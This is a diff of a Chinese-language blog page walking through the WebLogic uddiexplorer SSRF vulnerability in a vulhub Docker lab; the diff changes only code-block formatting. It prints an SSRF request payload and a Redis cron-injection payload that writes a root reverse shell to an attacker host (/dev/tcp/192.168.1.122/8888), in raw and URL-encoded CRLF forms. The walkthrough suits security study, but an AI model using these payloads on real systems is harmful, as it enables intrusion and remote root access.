@@ -39,15 +39,14 @@
 
 <h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
 <p>环境采用vulhub上现有docker环境进行复现</p>
-<pre class="language-none"><code class="language-none">docker-compose build
-docker-compose up -d</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p>
 <h2 id="ssrf漏洞测试"><a href="#ssrf漏洞测试" class="headerlink" title="ssrf漏洞测试"></a>ssrf漏洞测试</h2><p>漏洞位置</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br></pre></td></tr></table></figure>
 
 <p>payload</p>
-<pre class="language-none"><code class="language-none">?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>
 
 <p>这里默认存在一个远程资源的加载，且未经过严格过滤</p>
 <h2 id="ssrf漏洞探测内网主机端口"><a href="#ssrf漏洞探测内网主机端口" class="headerlink" title="ssrf漏洞探测内网主机端口"></a>ssrf漏洞探测内网主机端口</h2><p>可访问的端口会得到错误，一般会返回status code,如果访问的是非http的端口，则返回<code> which did not have a valid SOAP content-type</code></p>
@@ -58,20 +57,13 @@ docker-compose up -d</code></pre>
 <h2 id="ssrf漏洞redis反弹shell"><a href="#ssrf漏洞redis反弹shell" class="headerlink" title="ssrf漏洞redis反弹shell"></a>ssrf漏洞redis反弹shell</h2><p>探测内网的redis发现目标在<code>192.168.128.2</code></p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121141658.png"></p>
 <p>定时任务payload</p>
-<pre class="language-none"><code class="language-none">test
-
-set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.122&#x2F;8888 0&gt;&amp;1\n\n\n\n&quot;
-config set dir &#x2F;etc&#x2F;
-config set dbfilename crontab
-save
-
-aaa</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.1.122/8888 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
 
 <p>进行url编码</p>
-<pre class="language-none"><code class="language-none">test%0A%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0A%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa</span><br></pre></td></tr></table></figure>
 
 <p>将其中的<code>%0a</code>替换成<code>%0d%0a</code></p>
-<pre class="language-none"><code class="language-none">test%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20%2Fetc%2F%0d%0aconfig%20set%20dbfilename%20crontab%0d%0asave%0d%0a%0d%0aaaa</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20%2Fetc%2F%0d%0aconfig%20set%20dbfilename%20crontab%0d%0asave%0d%0a%0d%0aaaa</span><br></pre></td></tr></table></figure>
 
 <p>发起攻击</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121144835.png"></p>
